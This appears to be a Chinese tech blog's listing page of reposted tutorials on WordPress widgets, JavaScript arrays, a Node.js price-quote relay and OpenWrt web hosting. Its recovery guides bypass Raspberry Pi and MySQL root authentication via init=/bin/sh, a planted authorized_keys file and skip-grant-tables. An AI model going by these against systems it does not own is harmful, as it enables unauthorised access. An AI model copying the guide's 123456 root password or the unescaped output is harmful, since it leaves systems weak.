Text Input --&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">            &lt;label <span class="keyword">for</span>=<span class="string">"&lt;?php echo $this-&gt;get_field_id( 'name' ); ?&gt;"</span>&gt;<span class="meta">&lt;?php</span> _e(<span class="string">'Your Name:'</span>, <span class="string">'example'</span>); <span class="meta">?&gt;</span>&lt;/label&gt;</span><br><span class="line">            &lt;input id=<span class="string">"&lt;?php echo $this-&gt;get_field_id( 'name' ); ?&gt;"</span> name=<span class="string">"&lt;?php echo $this-&gt;get_field_name( 'name' ); ?&gt;"</span> value=<span class="string">"&lt;?php echo $instance['name']; ?&gt;"</span> style=<span class="string">"width:100%;"</span> /&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- Sex: Select Box --&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">            &lt;label <span class="keyword">for</span>=<span class="string">"&lt;?php echo $this-&gt;get_field_id( 'sex' ); ?&gt;"</span>&gt;<span class="meta">&lt;?php</span> _e(<span class="string">'Sex:'</span>, <span class="string">'example'</span>); <span class="meta">?&gt;</span>&lt;/label&gt; </span><br><span class="line">            &lt;select id="&lt;?php echo $this-&gt;get_field_id( 'sex' ); ?&gt;" name="&lt;?php echo $this-&gt;get_field_name( 'sex' ); ?&gt;" class="widefat" style="width:100%;"&gt;</span><br><span class="line">                &lt;option <span class="meta">&lt;?php</span> <span class="keyword">if</span> ( <span class="string">'male'</span> == $instance[<span class="string">'format'</span>] ) <span class="keyword">echo</span> <span class="string">'selected="selected"'</span>; <span class="meta">?&gt;</span>&gt;male&lt;/option&gt;</span><br><span class="line">                &lt;option <span class="meta">&lt;?php</span> <span class="keyword">if</span> ( <span class="string">'female'</span> == $instance[<span class="string">'format'</span>] ) <span class="keyword">echo</span> <span class="string">'selected="selected"'</span>; <span class="meta">?&gt;</span>&gt;female&lt;/option&gt;</span><br><span class="line">            &lt;/select&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- Show Sex? Checkbox --&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">            &lt;input class="checkbox" type="checkbox" &lt;?php checked( $instance['show_sex'], true ); ?&gt; id="&lt;?php echo $this-&gt;get_field_id( 'show_sex' ); ?&gt;" name="&lt;?php echo $this-&gt;get_field_name( 'show_sex' ); ?&gt;" /&gt; </span><br><span class="line">            &lt;label <span class="keyword">for</span>=<span class="string">"&lt;?php echo $this-&gt;get_field_id( 'show_sex' ); ?&gt;"</span>&gt;<span class="meta">&lt;?php</span> _e(<span class="string">'Display sex publicly?'</span>, <span class="string">'example'</span>); <span class="meta">?&gt;</span>&lt;/label&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>转载自：<a href="http://summerbluet.com/225" target="_blank" rel="noopener">http://summerbluet.com/225</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Web-开发/">Web 开发</a>
    </span>
    

    

    </div>

    
    <div class="article-meta pull-right">
      <span>
        <i class="icon-comments"></i>
        <span>
          <a href="/2015/11/04/WordPress 插件开发实例 – 详细注释的 Widget 开发例子/#comment">评论</a>
        </span>
      </span>
    </div>
    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/11/02/Js数组里删除指定的元素（不是指定的位置）/"><span>Js数组里删除指定的元素（不是指定的位置）</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/11/02/Js数组里删除指定的元素（不是指定的位置）/" rel="bookmark">
        <time class="entry-date published" datetime="2015-11-02T05:34:04.000Z">
          2015-11-02
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>之前一直是做后端的，从来也没有写过js，但是却一直想学学，也只是基于兴趣而已！现在到了这个公司，确实大量的写js。但也一直都是没有系统的去看过js！都是搞什么查什么！<br>最近要解决一个问题，但是用到了js的数组，知道了元素要去删除这个数组中的这个指定的元素。网上找到了一些解决办法，在这里做个笔记记下来：<br>首先可以给js的数组对象定义一个函数，用于查找指定的元素在数组中的位置，即索引，代码为：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.indexOf = <span class="function"><span class="keyword">function</span>(<span class="params">val</span>) </span>&#123;              </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.length; i++) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>[i] == val) <span class="keyword">return</span> i;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>然后使用通过得到这个元素的索引，使用js数组自己固有的函数去删除这个元素：<br>代码为：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.remove = <span class="function"><span class="keyword">function</span>(<span class="params">val</span>) </span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> index = <span class="keyword">this</span>.indexOf(val);  </span><br><span class="line">    <span class="keyword">if</span> (index &gt; <span class="number">-1</span>) &#123;  </span><br><span class="line">        <span class="keyword">this</span>.splice(index, <span class="number">1</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>这样就构造了这样一个函数，比如我有有一个数组：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> emp = [<span class="string">'abs'</span>,<span class="string">'dsf'</span>,<span class="string">'sdf'</span>,<span class="string">'fd'</span>];</span><br></pre></td></tr></table></figure></p>
<p>假如我们要删除其中的fd,就可以使用:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emp.remove(<span class="string">'fd'</span>);</span><br></pre></td></tr></table></figure></p>
<p>转载自 <a href="http://my.oschina.net/zh119893/blog/265964" target="_blank" rel="noopener">http://my.oschina.net/zh119893/blog/265964</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Web-开发/">Web 开发</a>
    </span>
    

    

    </div>

    
    <div class="article-meta pull-right">
      <span>
        <i class="icon-comments"></i>
        <span>
          <a href="/2015/11/02/Js数组里删除指定的元素（不是指定的位置）/#comment">评论</a>
        </span>
      </span>
    </div>
    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/10/20/黄金&白银实时报价实现方法/"><span>黄金&amp;白银实时报价实现方法</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/10/20/黄金&白银实时报价实现方法/" rel="bookmark">
        <time class="entry-date published" datetime="2015-10-20T05:41:12.000Z">
          2015-10-20
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>　　先声明，数据依旧来自 jin10.com。<br>　　之前写了篇文章《<a href="http://futa.ooo/2330.html">加上了“财经消息”小工具。。。但我感觉应该没人会看</a>》，是写的“财经消息”小工具里的资讯的推送，那个比较简单，因为金十的部分服务器没有验证 origin，拿来就能用。但报价的话就不行了，必须靠一台尽量快的服务器来中转数据（报价对实时性的要求极高），于是我还是选择了 Daocloud（关于 Docker 的使用：《<a href="http://futa.ooo/2304.html">初识 Docker – 使用 tenxcloud.com 搭建自己的应用</a>》）来做中转。ok 废话少说，接下来就来看下源码，其实只有一个文件：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="built_in">require</span>(<span class="string">'express'</span>)();</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>).Server(app);</span><br><span class="line"><span class="keyword">var</span> io = <span class="built_in">require</span>(<span class="string">'socket.io'</span>)(http);</span><br><span class="line"><span class="keyword">var</span> Pio=<span class="built_in">require</span>(<span class="string">"socket.io-client"</span>);</span><br><span class="line"><span class="keyword">var</span> Psocket=Pio.connect(<span class="string">"http://121.40.214.64:8080"</span>);</span><br><span class="line"><span class="keyword">var</span> Nsocket=Pio.connect(<span class="string">"http://c3.jin10.com:8081"</span>);</span><br><span class="line"><span class="keyword">var</span> request = <span class="built_in">require</span>(<span class="string">'request'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> his = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">Psocket.on(<span class="string">'connect'</span> , <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Psocket.emit(<span class="string">'delAllSubscription'</span> , []);</span><br><span class="line">    Psocket.emit(<span class="string">'addSubscription'</span> , [<span class="string">'XAUUSD'</span> , <span class="string">'XAGUSD'</span> , <span class="string">'UKOIL'</span> , <span class="string">'USOIL'</span> , <span class="string">'DXY'</span> , <span class="string">'EURUSD'</span> , <span class="string">'GC'</span> , <span class="string">'GBPUSD'</span>, <span class="string">'USDJPY'</span>, <span class="string">'AUDUSD'</span>, <span class="string">'USDCHF'</span>, <span class="string">'EURGBP'</span>, <span class="string">'EURJPY'</span>, <span class="string">'XPDUSD'</span> , <span class="string">'DOWI'</span> ,<span class="string">'NASX'</span> ,<span class="string">'SPX500'</span> ,<span class="string">'JPN225'</span> ,<span class="string">'SZZZ'</span> ,<span class="string">'SZCZ'</span> ,<span class="string">'XPTUSD'</span>]);</span><br><span class="line">    Psocket.emit(<span class="string">'reqvote'</span>, <span class="string">"ok"</span>);</span><br><span class="line">&#125;);</span><br><span class="line">Nsocket.on(<span class="string">'connect'</span> , <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Nsocket.emit(<span class="string">'reg'</span>, <span class="string">"ok"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    request(<span class="string">'http://www.jin10.com/jin10.com.html'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">error, response, body</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!error &amp;&amp; response.statusCode == <span class="number">200</span>) &#123;</span><br><span class="line">            res.header(<span class="string">"Access-Control-Allow-Origin"</span>, <span class="string">"*"</span>);</span><br><span class="line">            res.send(body.replace(<span class="regexp">/\n|\s&#123;3,&#125;/g</span>,<span class="string">""</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">io.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">socket</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> his) &#123;</span><br><span class="line">        io.emit(<span class="string">'price list'</span>, his[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">Psocket.on(<span class="string">'price list'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">    his[msg[<span class="string">'name'</span>]]=msg;</span><br><span class="line">    io.emit(<span class="string">'price list'</span>, msg);</span><br><span class="line">    <span class="built_in">console</span>.log(msg);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Nsocket.on(<span class="string">'user message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">    io.emit(<span class="string">'user message'</span>, msg);</span><br><span class="line">    <span class="built_in">console</span>.log(msg);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">http.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'listening on *:3000'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>没错就是那么简单 = =</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Web-开发/">Web 开发</a>
    </span>
    

    

    </div>

    
    <div class="article-meta pull-right">
      <span>
        <i class="icon-comments"></i>
        <span>
          <a href="/2015/10/20/黄金&白银实时报价实现方法/#comment">评论</a>
        </span>
      </span>
    </div>
    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/10/12/openwrt安装php,mysql,Lighttpd建站/"><span>openwrt安装php,mysql,Lighttpd建站</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/10/12/openwrt安装php,mysql,Lighttpd建站/" rel="bookmark">
        <time class="entry-date published" datetime="2015-10-12T06:55:40.000Z">
          2015-10-12
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p><strong>一、安装</strong><br>1、输入如下命令更新软件列表：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opkg update</span><br></pre></td></tr></table></figure></p>
<p>2、输入如下命令安装php,mysql,Lighttpd及其组件：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">opkg install php5 php5-mod-gd php5-mod-session php5-mod-pdo php5-mod-pdo-mysql php5-mod-mysql php5-mod-mcrypt php5-mod-mbstring php5-fastcgi php5-cgi php5-mod-xml php5-mod-ctype php5-mod-curl php5-mod-exif php5-mod-ftp php5-mod-iconv php5-mod-json php5-mod-sockets php5-mod-sqlite3 php5-mod-tokenizer php5-mod-zip php5-mod-mysqli zoneinfo-core zoneinfo-asia</span><br><span class="line">opkg install mysql-server libncursesw libncurses libreadline terminfo uclibcxx zlib libmysqlclient libmcrypt libltdl libmcrypt</span><br><span class="line">opkg install lighttpd lighttpd-mod-fastcgi lighttpd-mod-access lighttpd-mod-alias lighttpd-mod-rewrite lighttpd-mod-redirect libncurses</span><br></pre></td></tr></table></figure></p>
<p><strong>二、配置Lighttpd：</strong><br>编辑/etc/lighttpd/lighttpd.conf文件</p>
<ol>
<li>找到【server.document-root =”/www”】将【/www】改为你自己网站存放的路径（比如我的是/web）</li>
<li><p>在 static-file.exclude-extensions = ( “.php”, “.pl”, “.fcgi” ) 下插入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fastcgi.server = (</span><br><span class="line">        &quot;.php&quot; =&gt; (</span><br><span class="line">                &quot;localhost&quot; =&gt; (</span><br><span class="line">                        &quot;socket&quot; =&gt; &quot;/tmp/php-fastcgi.socket&quot;,</span><br><span class="line">                        &quot;bin-path&quot; =&gt; &quot;/usr/bin/php-fcgi&quot;</span><br><span class="line">                )</span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</li>
<li><p>找到【#server.port = 81】去掉#，将81更改为你想要的端口号</p>
</li>
</ol>
<p><strong>三、配置php</strong><br>打开/etc/php.ini</p>
<ol>
<li>查找;short_open_tag = off改为short_open_tag = on</li>
<li>查找doc_root = “/www”改为doc_root = “/web”（改为你自己网站存放的路径和Lighttpd的保持一样）</li>
<li>分别找到以下内容:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">extension=ctype.so</span><br><span class="line">extension=curl.so</span><br><span class="line">extension=gd.so</span><br><span class="line">extension=iconv.so</span><br><span class="line">extension=json.so</span><br><span class="line">extension=mbstring.so</span><br><span class="line">extension=mcrypt.so</span><br><span class="line">extension=mysql.so</span><br><span class="line">extension=pdo.so</span><br><span class="line">extension=pdo-mysql.so</span><br><span class="line">extension=session.so</span><br><span class="line">extension=sockets.so</span><br><span class="line">extension=tokenizer.so</span><br><span class="line">extension=xml.so</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>分别将前面的“;”去掉</p>
<ol start="4">
<li>找到date.timezone =在后面加上 prc也就是date.timezone = prc</li>
<li>查找mysql.default_socket =改为mysql.default_socket = /var/run/mysqld.sock</li>
</ol>
<p><strong>四、配置mysql</strong></p>
<ol>
<li><p>输入如下命令创建数据库文件夹：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /mnt/data /mnt/data/mysql /mnt/data/tmp</span><br></pre></td></tr></table></figure>
</li>
<li><p>输入如下命令创建默认的数据库：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/mysql_install_db --force</span><br></pre></td></tr></table></figure>
</li>
<li><p>输入如下命令启动mysql：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/mysqld start</span><br></pre></td></tr></table></figure>
</li>
<li><p>输入如下命令创建mysql的密码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/mysqladmin -u root password 123456</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>ok到此配置完毕</p>
<ol start="5">
<li>输入如下命令启动Lighttpd：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/lighttpd start</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>转载自 <a href="http://www.right.com.cn/forum/thread-121342-1-1.html" target="_blank" rel="noopener">http://www.right.com.cn/forum/thread-121342-1-1.html</a>，有删改</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/openwrt/">openwrt</a>
    </span>
    

    

    </div>

    
    <div class="article-meta pull-right">
      <span>
        <i class="icon-comments"></i>
        <span>
          <a href="/2015/10/12/openwrt安装php,mysql,Lighttpd建站/#comment">评论</a>
        </span>
      </span>
    </div>
    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/10/08/树莓派忘记登录密码怎么办/"><span>树莓派忘记登录密码怎么办</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/10/08/树莓派忘记登录密码怎么办/" rel="bookmark">
        <time class="entry-date published" datetime="2015-10-08T08:07:31.000Z">
          2015-10-08
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>借给同学之后自己把密码忘了……雅蠛蝶……可惜没把显示屏带回来，查了一圈之后灵机一动(*￣▽￣)y</p>
<p><strong>如果你有显示屏+USB键盘</strong></p>
<ul>
<li>将SD卡插入电脑（windows下只挂载boot分区）</li>
</ul>
<ul>
<li>打开boot分区，编辑command.txt(注意不要用记事本，可能会换行符坑爹）</li>
</ul>
<ul>
<li>在第一行末尾加上init=/bin/sh，完成后大概是这样 <code>... root=/dev/mmcblk0p2 rootfstype=ext4 elevator=deadline rootwait init=/bin/sh</code></li>
</ul>
<ul>
<li>插卡，重启，连接键盘显示器</li>
</ul>
<ul>
<li>出现shell后用passwd更改密码</li>
</ul>
<p><strong>没有的话呢？</strong></p>
<ul>
<li>想办法让电脑和树莓派连通，可以用路由器，或者电脑装个dhcpd等</li>
</ul>
<ul>
<li>生成一对密钥对，注意必须是openssh兼容格式而不是putty等密钥格式</li>
</ul>
<ul>
<li>使用一个流行的linux发行版，将SD卡插入电脑；如果是老旧的版本，你可能需要手动挂载SD卡里的ext4分区</li>
</ul>
<ul>
<li>进入/分区，在/root下建立一个.ssh文件夹（如果没有的话），并chmod 700</li>
</ul>
<ul>
<li>在/root/.ssh/下建立一个文件authorized_keys，并chmod 600</li>
</ul>
<ul>
<li>将公钥内容写入新创建的文件中</li>
</ul>
<ul>
<li>sync，umount</li>
</ul>
<ul>
<li>插卡，重启，ssh使用root账户连接，并指定刚才的私钥</li>
</ul>
<ul>
<li>passwd修改密码</li>
</ul>
<p>转载自 <a href="http://yooooo.us/2015/recover-raspi-password?variant=zh-hans" target="_blank" rel="noopener">http://yooooo.us/2015/recover-raspi-password?variant=zh-hans</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/树莓派/">树莓派</a>
    </span>
    

    

    </div>

    
    <div class="article-meta pull-right">
      <span>
        <i class="icon-comments"></i>
        <span>
          <a href="/2015/10/08/树莓派忘记登录密码怎么办/#comment">评论</a>
        </span>
      </span>
    </div>
    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/10/08/Linux下MySQL的root密码忘记解决方法/"><span>Linux下MySQL的root密码忘记解决方法</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/10/08/Linux下MySQL的root密码忘记解决方法/" rel="bookmark">
        <time class="entry-date published" datetime="2015-10-08T08:03:05.000Z">
          2015-10-08
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>验证环境：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# rpm -qa | grep mysql</span><br><span class="line">mysql-5.1.71-1.el6.i686</span><br><span class="line">mysql-server-5.1.71-1.el6.i686</span><br><span class="line">mysql-libs-5.1.71-1.el6.i686</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# lsb_release -a</span><br><span class="line">LSB Version:    :core-4.0-ia32:core-4.0-noarch:graphics-4.0-ia32:graphics-4.0-noarch:printing-4.0-ia32:printing-4.0-noarch</span><br><span class="line">Distributor ID: CentOS</span><br><span class="line">Description:    CentOS Linux release 6.0 (Final)</span><br><span class="line">Release:        6.0</span><br><span class="line">Codename:      Final</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# uname -r</span><br><span class="line">2.6.32-71.el6.i686</span><br></pre></td></tr></table></figure></p>
<p>1．首先确认服务器出于安全的状态，也就是没有人能够任意地连接MySQL数据库。<br>因为在重新设置MySQL的root密码的期间，MySQL数据库完全出于没有密码保护的状态下，其他的用户也可以任意地登录和修改MySQL的信息。可以采用将MySQL对外的端口封闭，并且停止Apache以及所有的用户进程的方法实现服务器的准安全状态。最安全的状态是到服务器的Console上面操作，并且拔掉网线。</p>
<p>2．修改MySQL的登录设置：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/my.cnf</span><br></pre></td></tr></table></figure></p>
<p>在[mysqld]的段中加上一句：skip-grant-tables<br>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[mysqld] </span><br><span class="line">datadir=/var/lib/mysql </span><br><span class="line">socket=/var/lib/mysql/mysql.sock </span><br><span class="line">skip-grant-tables</span><br></pre></td></tr></table></figure></p>
<p>保存并且退出vi。</p>
<p>3．重新启动mysqld<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># /etc/init.d/mysqld restart </span><br><span class="line">Stopping MySQL: [ OK ] </span><br><span class="line">Starting MySQL: [ OK ]</span><br></pre></td></tr></table></figure></p>
<p>4．登录并修改MySQL的root密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# mysql</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \\g.</span><br><span class="line">Your MySQL connection id is 3</span><br><span class="line">Server version: 5.1.71 Source distribution</span><br><span class="line">Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line">Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.</span><br><span class="line">mysql&gt;UPDATE mysql.user SET Password = password (&quot;new-password&quot;) WHERE User = &apos;root&apos;;</span><br><span class="line">Query OK, 3 rows affected (0.00 sec)</span><br><span class="line">Rows matched: 3  Changed: 3  Warnings: 0</span><br><span class="line">mysql&gt; exit</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure></p>
<p>5．将MySQL的登录设置修改回来<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/my.cnf</span><br></pre></td></tr></table></figure></p>
<p>将刚才在[mysqld]的段中加上的skip-grant-tables删除,保存并且退出vi；</p>
<p>6．再次重新启动mysqld<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># /etc/init.d/mysqld restart </span><br><span class="line">Stopping MySQL: [ OK ] </span><br><span class="line">Starting MySQL: [ OK ]</span><br></pre></td></tr></table></figure></p>
<p>7、使用新的密码登录，正常登录，搞定！</p>
<p>转载自 <a href="http://www.linuxidc.com/Linux/2013-07/87069.htm" target="_blank" rel="noopener">http://www.linuxidc.com/Linux/2013-07/87069.htm</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/VPS-技术/">VPS 技术</a>
    </span>
    

    

    </div>

    
    <div class="article-meta pull-right">
      <span>
        <i class="icon-comments"></i>
        <span>
          <a href="/2015/10/08/Linux下MySQL的root密码忘记解决方法/#comment">评论</a>
        </span>
      </span>
    </div>
    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/10/07/重写了下博客的播放器/"><span>重写了下博客的播放器</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/10/07/重写了下博客的播放器/" rel="bookmark">
        <time class="entry-date published" datetime="2015-10-07T02:03:16.000Z">
          2015-10-07
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>国庆无聊，对博客的播放器做了比较大幅度的修改，总结一下现有以下改进:</p>
<ol>
<li>添加了”自动播放”复选框，可以由用户自主决定是否需要播放背景音乐(其实歌都不错的。。)</li>
</ol>
<ol start="2">
<li>使用 node.js 重写了多标签的背景音乐控制器，主要是为了避免产生当用户打开多个标签后背景音乐同时播放的问题</li>
</ol>
